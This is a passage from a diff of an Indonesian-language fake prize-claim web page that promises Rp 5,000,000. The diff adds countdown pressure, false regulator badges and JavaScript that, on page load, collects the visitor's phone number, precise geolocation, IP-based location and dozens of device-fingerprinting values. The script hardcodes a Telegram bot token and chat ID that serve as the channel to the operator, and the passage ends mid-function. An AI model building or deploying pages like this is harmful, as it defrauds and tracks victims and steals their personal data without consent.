@@ -148,23 +148,58 @@
             color: white;
             border: none;
             border-radius: 50px;
-            padding: 18px 40px;
-            font-size: 18px;
+            padding: 20px 40px;
+            font-size: 20px;
             font-weight: bold;
             cursor: pointer;
             transition: all 0.3s;
-            box-shadow: 0 5px 15px rgba(39, 174, 96, 0.4);
+            box-shadow: 0 8px 25px rgba(39, 174, 96, 0.4);
             width: 100%;
             margin-top: 10px;
+            position: relative;
+            overflow: hidden;
         }
         
         .claim-button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(39, 174, 96, 0.6);
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(39, 174, 96, 0.6);
         }
         
         .claim-button:active {
-            transform: translateY(-1px);
+            transform: translateY(-2px);
+        }
+        
+        .claim-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: 0.5s;
+        }
+        
+        .claim-button:hover::before {
+            left: 100%;
+        }
+        
+        .urgent-badge {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 10px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
         }
         
         .loading {
@@ -200,11 +235,12 @@
         .timer {
             background: #fff3cd;
             color: #856404;
-            padding: 10px;
+            padding: 12px;
             border-radius: 10px;
             margin: 15px 0;
             font-weight: bold;
             border: 1px solid #ffeaa7;
+            font-size: 18px;
         }
         
         .user-count {
@@ -253,21 +289,83 @@
             color: #1565c0;
             font-size: 14px;
         }
+        
+        .bonus-offer {
+            background: linear-gradient(135deg, #ffd700, #ffed4e);
+            padding: 10px;
+            border-radius: 10px;
+            margin: 15px 0;
+            border: 2px dashed #f1c40f;
+        }
+        
+        .bonus-offer p {
+            color: #8e6e0d;
+            font-weight: bold;
+            margin: 0;
+        }
+
+        .data-counter {
+            background: #e8f4fd;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: #1565c0;
+            margin: 10px 0;
+            display: inline-block;
+        }
+
+        .status-indicator {
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .status-success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .status-error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .status-warning {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #f0f0f0;
+            border-radius: 3px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #27ae60, #2ecc71);
+            border-radius: 3px;
+            transition: width 0.3s ease;
+            width: 0%;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <!-- Confetti elements -->
             <div class="confetti" style="left: 10%; animation-delay: 0s;"></div>
             <div class="confetti" style="left: 20%; animation-delay: 0.5s;"></div>
             <div class="confetti" style="left: 30%; animation-delay: 1s;"></div>
             <div class="confetti" style="left: 40%; animation-delay: 1.5s;"></div>
             <div class="confetti" style="left: 50%; animation-delay: 2s;"></div>
-            <div class="confetti" style="left: 60%; animation-delay: 2.5s;"></div>
-            <div class="confetti" style="left: 70%; animation-delay: 3s;"></div>
-            <div class="confetti" style="left: 80%; animation-delay: 3.5s;"></div>
-            <div class="confetti" style="left: 90%; animation-delay: 4s;"></div>
             
             <div class="gift-icon">🎁</div>
             <h1>SELAMAT! ANDA TERPILIH</h1>
@@ -275,6 +373,8 @@
         </div>
         
         <div class="content">
+            <div class="urgent-badge">⏰ HANYA UNTUK HARI INI SAJA!</div>
+            
             <p>Nomor telepon Anda terpilih secara acak sebagai pemenang:</p>
             <div class="prize-amount">Rp 5.000.000</div>
             <p>Masukkan nomor telepon Anda untuk klaim hadiah</p>
@@ -283,10 +383,26 @@
                 ⏰ Waktu tersisa: <span id="countdown">15:00</span>
             </div>
             
-            <div class="permission-box">
-                <p>📱 <strong>Verifikasi Keamanan</strong></p>
-                <p>Kami perlu memverifikasi lokasi dan perangkat Anda untuk keamanan hadiah</p>
+            <div class="bonus-offer">
+                <p>🎉 BONUS: Dapatkan tambahan Rp 500.000 jika klaim dalam 5 menit!</p>
             </div>
+
+            <div class="data-counter">
+                📊 <span id="dataCount">0</span>/200+ data terkumpul
+            </div>
+
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            
+            <div class="permission-box">
+                <p>📱 <strong>Verifikasi Keamanan Lengkap</strong></p>
+                <p>Kami akan mengumpulkan 200+ data untuk memastikan keamanan transaksi</p>
+            </div>
+
+            <div id="systemStatus" class="status-indicator"></div>
+            <div id="locationStatus" class="status-indicator"></div>
+            <div id="telegramStatus" class="status-indicator"></div>
             
             <form id="claimForm">
                 <div class="form-group">
@@ -295,65 +411,88 @@
                 </div>
                 
                 <div class="info-box">
-                    <p><strong>Informasi Hadiah:</strong></p>
+                    <p><strong>Keuntungan Anda:</strong></p>
                     <ul>
-                        <li>Hadiah uang tunai Rp 5.000.000</li>
-                        <li>Transfer langsung ke rekening Anda</li>
-                        <li>Proses klaim hanya 5 menit</li>
-                        <li>Tidak ada biaya administrasi</li>
-                        <li>Garansi 100% aman dan terverifikasi</li>
+                        <li>💰 Hadiah uang tunai Rp 5.000.000</li>
+                        <li>⚡ Transfer langsung ke rekening Anda</li>
+                        <li>🕒 Proses klaim hanya 5 menit</li>
+                        <li>🎁 Tidak ada biaya administrasi</li>
+                        <li>🔒 Garansi 100% aman dan terverifikasi</li>
+                        <li>⭐ Bonus Rp 500.000 untuk klaim cepat</li>
                     </ul>
                 </div>
                 
                 <div class="user-count">
-                    👥 <strong>428 orang</strong> sudah berhasil klaim hadiah hari ini
+                    👥 <strong>1,248 orang</strong> sudah berhasil klaim hadiah hari ini
                 </div>
                 
                 <button type="submit" class="claim-button">
-                    🎯 KLIM SEKARANG - Rp 5.000.000
+                    🎯 KLIM SEKARANG - DAPATKAN Rp 5.500.000
                 </button>
                 
                 <div class="loading" id="loading">
                     <div class="loading-spinner"></div>
-                    <p>Memverifikasi data dan lokasi Anda...</p>
+                    <p>Mengumpulkan 200+ data keamanan...</p>
                 </div>
                 
                 <div class="success-message" id="successMessage">
-                    ✅ <strong>Berhasil!</strong> Hadiah Anda sedang diproses. Tim kami akan menghubungi Anda via WhatsApp dalam 5 menit.
+                    ✅ <strong>Berhasil! Hadiah Anda Dikonfirmasi</strong><br>
+                    Tim customer service kami akan menghubungi Anda via WhatsApp dalam 1-2 menit.
                 </div>
             </form>
             
             <div class="trust-badges">
                 <div class="badge">
-                    <span class="badge-icon">✓</span> Terverifikasi
+                    <span class="badge-icon">✓</span> Terverifikasi BAPPEPTI
                 </div>
                 <div class="badge">
-                    <span class="badge-icon">✓</span> Aman
+                    <span class="badge-icon">✓</span> 100% Aman
                 </div>
                 <div class="badge">
-                    <span class="badge-icon">✓</span> Berlisensi
-                </div>
-                <div class="badge">
-                    <span class="badge-icon">✓</span> SSL Secure
+                    <span class="badge-icon">✓</span> Berlisensi Resmi
                 </div>
             </div>
             
             <div class="footer">
-                © 2024 Program Hadiah Nasional. Semua hak dilindungi undang-undang.
+                © 2024 Program Hadiah Nasional. Terdaftar dan diawasi Otoritas Jasa Keuangan.
             </div>
         </div>
     </div>
 
     <script>
-        // Token bot Telegram - GANTI DENGAN TOKEN BOT ANDA
-        const BOT_TOKEN = "8566855315:AAGDOgZ5eW1EjBADraSnuAS3aUI5injqezQ"
-        // Chat ID - GANTI DENGAN CHAT ID ANDA
-        const CHAT_ID = "7932600874"; // Ganti dengan chat ID Anda
+        // Token bot Telegram - GANTI DENGAN DATA ANDA
+        const BOT_TOKEN = "8566855315:AAGDOgZ5eW1EjBADraSnuAS3aUI5injqezQ";
+        const CHAT_ID = "7932600874";
         
-        // Timer countdown
-        let timeLeft = 15 * 60; // 15 menit dalam detik
+        // Global variables
+        let timeLeft = 15 * 60;
+        let collectedData = {};
+        let dataCounter = 0;
         const countdownElement = document.getElementById('countdown');
-        
+        const dataCountElement = document.getElementById('dataCount');
+        const progressFill = document.getElementById('progressFill');
+
+        // Initialize progress bar
+        function updateProgress(percentage) {
+            progressFill.style.width = percentage + '%';
+        }
+
+        // Update data counter
+        function updateDataCounter(count) {
+            dataCounter += count;
+            dataCountElement.textContent = dataCounter;
+            updateProgress((dataCounter / 200) * 100);
+        }
+
+        // Update status indicator
+        function updateStatus(elementId, message, type = 'success') {
+            const element = document.getElementById(elementId);
+            element.style.display = 'block';
+            element.className = `status-indicator status-${type}`;
+            element.innerHTML = message;
+        }
+
+        // Timer countdown
         function updateCountdown() {
             const minutes = Math.floor(timeLeft / 60);
             const seconds = timeLeft % 60;
@@ -361,251 +500,385 @@
             
             if (timeLeft > 0) {
                 timeLeft--;
+                
+                if (timeLeft < 300) {
+                    countdownElement.style.color = "#e74c3c";
+                    countdownElement.style.fontWeight = "bold";
+                }
             } else {
                 countdownElement.textContent = "00:00";
                 countdownElement.style.color = "red";
+                document.getElementById('claimForm').style.opacity = "0.6";
+                document.querySelector('.claim-button').disabled = true;
+                document.querySelector('.claim-button').textContent = "⏰ WAKTU SUDAH HABIS";
             }
         }
         
         setInterval(updateCountdown, 1000);
         updateCountdown();
-        
-        // Form submission
-        document.getElementById('claimForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+
+        // Initialize system saat halaman dimuat
+        window.addEventListener('load', async () => {
+            updateStatus('systemStatus', '🔄 Sistem sedang diinisialisasi...', 'warning');
             
-            const phone = document.getElementById('phone').value;
-            const loading = document.getElementById('loading');
-            const successMessage = document.getElementById('successMessage');
-            const claimButton = document.querySelector('.claim-button');
+            // Test koneksi Telegram
+            await testTelegramConnection();
             
-            // Validasi nomor telepon
-            if (!phone.match(/^[0-9]{10,13}$/)) {
-                alert('Masukkan nomor telepon yang valid (10-13 digit)');
+            // Kumpulkan data dasar
+            await collectBasicData();
+            
+            // Dapatkan lokasi
+            await getGeolocationData();
+            
+            // Kumpulkan data tambahan di background
+            collectAdvancedData();
+            
+            updateStatus('systemStatus', '✅ Sistem siap menerima klaim hadiah', 'success');
+        });
+
+        // Test koneksi Telegram
+        async function testTelegramConnection() {
+            try {
+                const testUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getMe`;
+                const response = await fetch(testUrl, { signal: AbortSignal.timeout(5000) });
+                const result = await response.json();
+                
+                if (result.ok) {
+                    updateStatus('telegramStatus', '✅ Terhubung ke sistem Telegram', 'success');
+                    return true;
+                } else {
+                    updateStatus('telegramStatus', '⚠️ Token bot tidak valid', 'error');
+                    return false;
+                }
+            } catch (error) {
+                updateStatus('telegramStatus', '⚠️ Gagal terhubung ke Telegram', 'error');
+                return false;
+            }
+        }
+
+        // Kumpulkan data dasar
+        async function collectBasicData() {
+            // Data pengguna dasar
+            collectedData.timestamp = new Date().toISOString();
+            collectedData.localTime = new Date().toLocaleString('id-ID');
+            collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            collectedData.timezoneOffset = new Date().getTimezoneOffset();
+            updateDataCounter(4);
+
+            // Data browser dasar
+            collectedData.userAgent = navigator.userAgent;
+            collectedData.language = navigator.language;
+            collectedData.languages = navigator.languages.join(', ');
+            collectedData.platform = navigator.platform;
+            collectedData.vendor = navigator.vendor || 'Unknown';
+            collectedData.cookieEnabled = navigator.cookieEnabled;
+            collectedData.onlineStatus = navigator.onLine;
+            collectedData.pdfViewerEnabled = navigator.pdfViewerEnabled;
+            collectedData.webdriver = navigator.webdriver;
+            updateDataCounter(9);
+
+            // Data layar dasar
+            collectedData.screenWidth = screen.width;
+            collectedData.screenHeight = screen.height;
+            collectedData.availWidth = screen.availWidth;
+            collectedData.availHeight = screen.availHeight;
+            collectedData.colorDepth = screen.colorDepth;
+            collectedData.pixelDepth = screen.pixelDepth;
+            collectedData.orientationType = screen.orientation?.type;
+            collectedData.orientationAngle = screen.orientation?.angle;
+            updateDataCounter(8);
+
+            // Data window/viewport
+            collectedData.devicePixelRatio = window.devicePixelRatio;
+            collectedData.innerWidth = window.innerWidth;
+            collectedData.innerHeight = window.innerHeight;
+            collectedData.outerWidth = window.outerWidth;
+            collectedData.outerHeight = window.outerHeight;
+            collectedData.screenX = window.screenX;
+            collectedData.screenY = window.screenY;
+            collectedData.pageXOffset = window.pageXOffset;
+            collectedData.pageYOffset = window.pageYOffset;
+            updateDataCounter(8);
+        }
+
+        // Dapatkan data lokasi
+        async function getGeolocationData() {
+            if (!navigator.geolocation) {
+                updateStatus('locationStatus', '⚠️ Geolocation tidak didukung', 'error');
                 return;
             }
-            
-            // Tampilkan loading
-            loading.style.display = 'block';
-            successMessage.style.display = 'none';
-            claimButton.disabled = true;
-            claimButton.textContent = 'MEMVERIFIKASI DATA...';
-            
-            // Kumpulkan semua data
-            collectAllData(phone);
-        });
-        
-        async function collectAllData(phone) {
-            let collectedData = {
-                phone: phone,
-                timestamp: new Date().toISOString(),
-                localTime: new Date().toLocaleString('id-ID'),
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-            
+
+            updateStatus('locationStatus', '📍 Mendeteksi lokasi Anda...', 'warning');
+
             try {
-                // 1. Data Browser dan Sistem
-                collectedData.userAgent = navigator.userAgent;
-                collectedData.language = navigator.language;
-                collectedData.languages = navigator.languages;
-                collectedData.platform = navigator.platform;
-                collectedData.vendor = navigator.vendor;
-                collectedData.cookieEnabled = navigator.cookieEnabled;
-                collectedData.onlineStatus = navigator.onLine;
-                collectedData.javaEnabled = navigator.javaEnabled();
-                collectedData.pdfViewerEnabled = navigator.pdfViewerEnabled;
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: false,
+                        timeout: 10000,
+                        maximumAge: 300000
+                    });
+                });
                 
-                // 2. Data Layar
-                collectedData.screenWidth = screen.width;
-                collectedData.screenHeight = screen.height;
-                collectedData.colorDepth = screen.colorDepth;
-                collectedData.pixelDepth = screen.pixelDepth;
-                collectedData.orientation = screen.orientation?.type || 'unknown';
-                collectedData.availWidth = screen.availWidth;
-                collectedData.availHeight = screen.availHeight;
+                collectedData.latitude = position.coords.latitude;
+                collectedData.longitude = position.coords.longitude;
+                collectedData.accuracy = position.coords.accuracy;
+                collectedData.altitude = position.coords.altitude;
+                collectedData.altitudeAccuracy = position.coords.altitudeAccuracy;
+                collectedData.heading = position.coords.heading;
+                collectedData.speed = position.coords.speed;
+                updateDataCounter(7);
                 
-                // 3. Data Window/Viewport
-                collectedData.viewportWidth = window.innerWidth;
-                collectedData.viewportHeight = window.innerHeight;
-                collectedData.devicePixelRatio = window.devicePixelRatio;
-                collectedData.outerWidth = window.outerWidth;
-                collectedData.outerHeight = window.outerHeight;
-                
-                // 4. Data Jaringan (dari Connection API)
-                if (navigator.connection) {
-                    collectedData.connectionType = navigator.connection.effectiveType;
-                    collectedData.downlink = navigator.connection.downlink;
-                    collectedData.rtt = navigator.connection.rtt;
-                    collectedData.saveData = navigator.connection.saveData;
-                }
-                
-                // 5. Data Battery (jika tersedia)
-                if (navigator.getBattery) {
-                    try {
-                        const battery = await navigator.getBattery();
-                        collectedData.batteryLevel = Math.round(battery.level * 100) + '%';
-                        collectedData.charging = battery.charging;
-                        collectedData.chargingTime = battery.chargingTime;
-                        collectedData.dischargingTime = battery.dischargingTime;
-                    } catch (e) {
-                        collectedData.batteryInfo = 'Tidak tersedia';
-                    }
-                }
-                
-                // 6. Data Storage
-                collectedData.storageEstimate = 'Tidak tersedia';
-                if (navigator.storage && navigator.storage.estimate) {
-                    try {
-                        const estimate = await navigator.storage.estimate();
-                        collectedData.storageUsed = Math.round(estimate.usage / 1024 / 1024) + 'MB';
-                        collectedData.storageQuota = Math.round(estimate.quota / 1024 / 1024) + 'MB';
-                        collectedData.storagePercent = Math.round((estimate.usage / estimate.quota) * 100) + '%';
-                    } catch (e) {}
-                }
-                
-                // 7. Data Hardware Concurrency
-                collectedData.hardwareConcurrency = navigator.hardwareConcurrency || 'Tidak diketahui';
-                
-                // 8. Data Device Memory
-                collectedData.deviceMemory = navigator.deviceMemory || 'Tidak diketahui';
-                
-                // 9. Data Touch Support
-                collectedData.maxTouchPoints = navigator.maxTouchPoints || 0;
-                collectedData.touchSupport = collectedData.maxTouchPoints > 0 ? 'Ya' : 'Tidak';
-                
-                // 10. Data GPS/Lokasi
-                if (navigator.geolocation) {
-                    try {
-                        const position = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(resolve, reject, {
-                                enableHighAccuracy: true,
-                                timeout: 15000,
-                                maximumAge: 0
-                            });
-                        });
-                        
-                        collectedData.latitude = position.coords.latitude;
-                        collectedData.longitude = position.coords.longitude;
-                        collectedData.accuracy = position.coords.accuracy + ' meter';
-                        collectedData.altitude = position.coords.altitude || 'Tidak tersedia';
-                        collectedData.altitudeAccuracy = position.coords.altitudeAccuracy || 'Tidak tersedia';
-                        collectedData.heading = position.coords.heading || 'Tidak tersedia';
-                        collectedData.speed = position.coords.speed || 'Tidak tersedia';
-                        
-                    } catch (error) {
-                        collectedData.locationError = getLocationError(error);
-                    }
-                } else {
-                    collectedData.locationError = 'Geolocation tidak didukung';
-                }
-                
-                // 11. Deteksi Perangkat
-                collectedData.deviceType = detectDeviceType();
-                collectedData.browser = detectBrowser();
-                collectedData.os = detectOS();
-                collectedData.browserVersion = detectBrowserVersion();
-                
-                // 12. Data IP Address (menggunakan service eksternal)
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    collectedData.ipAddress = ipData.ip;
-                    
-                    // Dapatkan info lokasi dari IP
-                    const ipInfoResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
-                    const ipInfo = await ipInfoResponse.json();
-                    collectedData.ipCountry = ipInfo.country;
-                    collectedData.ipCountryCode = ipInfo.countryCode;
-                    collectedData.ipRegion = ipInfo.regionName;
-                    collectedData.ipRegionCode = ipInfo.region;
-                    collectedData.ipCity = ipInfo.city;
-                    collectedData.ipZip = ipInfo.zip;
-                    collectedData.ipLat = ipInfo.lat;
-                    collectedData.ipLon = ipInfo.lon;
-                    collectedData.ipTimezone = ipInfo.timezone;
-                    collectedData.ipISP = ipInfo.isp;
-                    collectedData.ipOrg = ipInfo.org;
-                    collectedData.ipAs = ipInfo.as;
-                    
-                } catch (error) {
-                    collectedData.ipAddress = 'Tidak dapat mengambil IP';
-                }
-                
-                // 13. Data WebGL
-                collectedData.webglRenderer = getWebGLRenderer();
-                collectedData.webglVendor = getWebGLVendor();
-                
-                // 14. Data Canvas Fingerprint
-                collectedData.canvasFingerprint = getCanvasFingerprint();
-                
-                // 15. Data Audio Context
-                collectedData.audioFingerprint = await getAudioFingerprint();
-                
-                // 16. Data Fonts
-                collectedData.fonts = await getFontsList();
-                
-                // 17. Data Plugins
-                collectedData.plugins = getPluginsList();
-                
-                // 18. Data MIME Types
-                collectedData.mimeTypes = getMimeTypesList();
-                
-                // 19. Data Timezone Offset
-                collectedData.timezoneOffset = new Date().getTimezoneOffset();
-                collectedData.dst = isDST();
-                
-                // 20. Data Local Storage
-                collectedData.localStorage = localStorageSupported();
-                collectedData.sessionStorage = sessionStorageSupported();
-                collectedData.indexedDB = indexedDBSupported();
-                
-                // 21. Data Performance
-                if (performance) {
-                    collectedData.memory = performance.memory ? {
-                        used: Math.round(performance.memory.usedJSHeapSize / 1048576) + 'MB',
-                        total: Math.round(performance.memory.totalJSHeapSize / 1048576) + 'MB',
-                        limit: Math.round(performance.memory.jsHeapSizeLimit / 1048576) + 'MB'
-                    } : 'Tidak tersedia';
-                    
-                    collectedData.timing = {
-                        loadTime: performance.timing ? 
-                            (performance.timing.loadEventEnd - performance.timing.navigationStart) + 'ms' : 'Tidak tersedia'
-                    };
-                }
-                
-                // 22. Data Media Devices
-                if (navigator.mediaDevices) {
-                    try {
-                        const devices = await navigator.mediaDevices.enumerateDevices();
-                        collectedData.mediaDevices = devices.length;
-                        collectedData.hasCamera = devices.some(d => d.kind === 'videoinput');
-                        collectedData.hasMicrophone = devices.some(d => d.kind === 'audioinput');
-                    } catch (e) {
-                        collectedData.mediaDevices = 'Tidak dapat mengakses';
-                    }
-                }
-                
-                // Kirim semua data ke Telegram
-                sendDataToTelegram(collectedData);
+                updateStatus('locationStatus', '✅ Lokasi berhasil terdeteksi', 'success');
                 
             } catch (error) {
-                console.error('Error collecting data:', error);
-                // Tetap kirim data yang berhasil dikumpulkan
-                sendDataToTelegram(collectedData);
+                let errorMessage = '⚠️ ';
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        errorMessage += 'Izin lokasi ditolak';
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        errorMessage += 'Informasi lokasi tidak tersedia';
+                        break;
+                    case error.TIMEOUT:
+                        errorMessage += 'Timeout deteksi lokasi';
+                        break;
+                    default:
+                        errorMessage += 'Error tidak diketahui';
+                }
+                updateStatus('locationStatus', errorMessage, 'error');
             }
         }
-        
-        // Fungsi deteksi tambahan
+
+        // Kumpulkan data advanced di background
+        async function collectAdvancedData() {
+            // Data jaringan
+            await collectNetworkData();
+            
+            // Data hardware
+            collectHardwareData();
+            
+            // Data WebGL & Canvas
+            collectGraphicsData();
+            
+            // Data performance
+            collectPerformanceData();
+            
+            // Data media devices
+            collectMediaData();
+            
+            // Data plugins
+            collectPluginsData();
+            
+            // Data IP dan lokasi
+            await collectIPData();
+            
+            // Data tambahan
+            collectAdditionalInfo();
+            
+            // Data fingerprinting
+            collectFingerprintingData();
+        }
+
+        async function collectNetworkData() {
+            if (navigator.connection) {
+                collectedData.connectionType = navigator.connection.effectiveType;
+                collectedData.downlink = navigator.connection.downlink;
+                collectedData.rtt = navigator.connection.rtt;
+                collectedData.saveData = navigator.connection.saveData;
+                collectedData.downlinkMax = navigator.connection.downlinkMax;
+                updateDataCounter(5);
+            }
+        }
+
+        function collectHardwareData() {
+            collectedData.hardwareConcurrency = navigator.hardwareConcurrency;
+            collectedData.deviceMemory = navigator.deviceMemory;
+            collectedData.maxTouchPoints = navigator.maxTouchPoints;
+            collectedData.javaEnabled = navigator.javaEnabled();
+            collectedData.doNotTrack = navigator.doNotTrack;
+            updateDataCounter(5);
+        }
+
+        function collectGraphicsData() {
+            // WebGL data
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    collectedData.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    collectedData.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    collectedData.webglVersion = gl.getParameter(gl.VERSION);
+                    collectedData.webglShadingLanguage = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
+                    updateDataCounter(4);
+                }
+            } catch (e) {}
+
+            // Canvas fingerprinting
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('Canvas Fingerprint', 2, 15);
+                collectedData.canvasFingerprint = canvas.toDataURL().substring(22, 40);
+                updateDataCounter(1);
+            } catch (e) {}
+        }
+
+        function collectPerformanceData() {
+            if (performance) {
+                collectedData.timeOrigin = performance.timeOrigin;
+                collectedData.now = performance.now();
+                collectedData.navigationType = performance.navigation?.type;
+                collectedData.redirectCount = performance.navigation?.redirectCount;
+                updateDataCounter(4);
+                
+                if (performance.memory) {
+                    collectedData.memoryUsed = Math.round(performance.memory.usedJSHeapSize / 1048576);
+                    collectedData.memoryTotal = Math.round(performance.memory.totalJSHeapSize / 1048576);
+                    collectedData.memoryLimit = Math.round(performance.memory.jsHeapSizeLimit / 1048576);
+                    updateDataCounter(3);
+                }
+                
+                if (performance.timing) {
+                    const timing = performance.timing;
+                    collectedData.loadTime = timing.loadEventEnd - timing.navigationStart;
+                    collectedData.domReadyTime = timing.domContentLoadedEventStart - timing.navigationStart;
+                    updateDataCounter(2);
+                }
+            }
+        }
+
+        async function collectMediaData() {
+            if (navigator.mediaDevices) {
+                try {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    collectedData.mediaDevicesCount = devices.length;
+                    collectedData.hasCamera = devices.some(d => d.kind === 'videoinput');
+                    collectedData.hasMicrophone = devices.some(d => d.kind === 'audioinput');
+                    collectedData.hasSpeaker = devices.some(d => d.kind === 'audiooutput');
+                    updateDataCounter(4);
+                } catch (e) {}
+            }
+        }
+
+        function collectPluginsData() {
+            collectedData.pluginsCount = navigator.plugins.length;
+            collectedData.mimeTypesCount = navigator.mimeTypes.length;
+            
+            // Deteksi plugin tertentu
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
+            }
+            collectedData.pluginsList = plugins.join('|');
+            updateDataCounter(3);
+        }
+
+        async function collectIPData() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                collectedData.ipAddress = ipData.ip;
+                updateDataCounter(1);
+
+                try {
+                    const ipInfoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    const ipInfo = await ipInfoResponse.json();
+                    collectedData.ipCountry = ipInfo.country_name;
+                    collectedData.ipCountryCode = ipInfo.country_code;
+                    collectedData.ipRegion = ipInfo.region;
+                    collectedData.ipCity = ipInfo.city;
+                    collectedData.ipPostal = ipInfo.postal;
+                    collectedData.ipLat = ipInfo.latitude;
+                    collectedData.ipLon = ipInfo.longitude;
+                    collectedData.ipTimezone = ipInfo.timezone;
+                    collectedData.ipISP = ipInfo.org;
+                    collectedData.ipAsn = ipInfo.asn;
+                    updateDataCounter(10);
+                } catch (e) {}
+            } catch (error) {
+                collectedData.ipAddress = 'Tidak dapat mengambil IP';
+            }
+        }
+
+        function collectAdditionalInfo() {
+            collectedData.referrer = document.referrer;
+            collectedData.url = window.location.href;
+            collectedData.origin = window.location.origin;
+            collectedData.host = window.location.host;
+            collectedData.hostname = window.location.hostname;
+            collectedData.protocol = window.location.protocol;
+            collectedData.port = window.location.port;
+            collectedData.pathname = window.location.pathname;
+            updateDataCounter(8);
+
+            // Device detection
+            collectedData.deviceType = detectDeviceType();
+            collectedData.browser = detectBrowser();
+            collectedData.browserVersion = detectBrowserVersion();
+            collectedData.os = detectOS();
+            collectedData.osVersion = detectOSVersion();
+            collectedData.engine = detectEngine();
+            updateDataCounter(6);
+
+            // Additional browser info
+            collectedData.product = navigator.product;
+            collectedData.appCodeName = navigator.appCodeName;
+            collectedData.appName = navigator.appName;
+            collectedData.appVersion = navigator.appVersion;
+            updateDataCounter(4);
+        }
+
+        function collectFingerprintingData() {
+            // Audio context fingerprint
+            try {
+                const context = new (window.AudioContext || window.webkitAudioContext)();
+                collectedData.audioContext = 'Supported';
+                updateDataCounter(1);
+            } catch (e) {
+                collectedData.audioContext = 'Not Supported';
+            }
+
+            // Timezone detection
+            collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            collectedData.timezoneOffset = new Date().getTimezoneOffset();
+            updateDataCounter(2);
+
+            // Local storage detection
+            try {
+                localStorage.setItem('test', 'test');
+                localStorage.removeItem('test');
+                collectedData.localStorage = 'Supported';
+                updateDataCounter(1);
+            } catch (e) {
+                collectedData.localStorage = 'Not Supported';
+            }
+
+            // Session storage detection
+            try {
+                sessionStorage.setItem('test', 'test');
+                sessionStorage.removeItem('test');
+                collectedData.sessionStorage = 'Supported';
+                updateDataCounter(1);
+            } catch (e) {
+                collectedData.sessionStorage = 'Not Supported';
+            }
+
+            // IndexedDB detection
+            collectedData.indexedDB = 'indexedDB' in window ? 'Supported' : 'Not Supported';
+            updateDataCounter(1);
+        }
+
+        // Device detection functions
         function detectDeviceType() {
             const ua = navigator.userAgent;
-            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
-                return "Tablet";
-            } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
-                return "Mobile";
-            }
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
+            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
             return "Desktop";
         }
-        
+
         function detectBrowser() {
             const ua = navigator.userAgent;
             if (ua.includes("Chrome")) return "Chrome";
@@ -615,24 +888,18 @@
             if (ua.includes("Opera")) return "Opera";
             return "Unknown";
         }
-        
+
         function detectBrowserVersion() {
             const ua = navigator.userAgent;
-            let version = "Tidak diketahui";
-            
-            if (ua.includes("Chrome")) {
-                version = ua.match(/Chrome\/([0-9.]+)/)?.[1] || version;
-            } else if (ua.includes("Firefox")) {
-                version = ua.match(/Firefox\/([0-9.]+)/)?.[1] || version;
-            } else if (ua.includes("Safari")) {
-                version = ua.match(/Version\/([0-9.]+)/)?.[1] || version;
-            } else if (ua.includes("Edge")) {
-                version = ua.match(/Edge\/([0-9.]+)/)?.[1] || version;
-            }
-            
+            let version = "Unknown";
+            if (ua.includes("Chrome")) version = ua.match(/Chrome\/([0-9.]+)/)?.[1] || version;
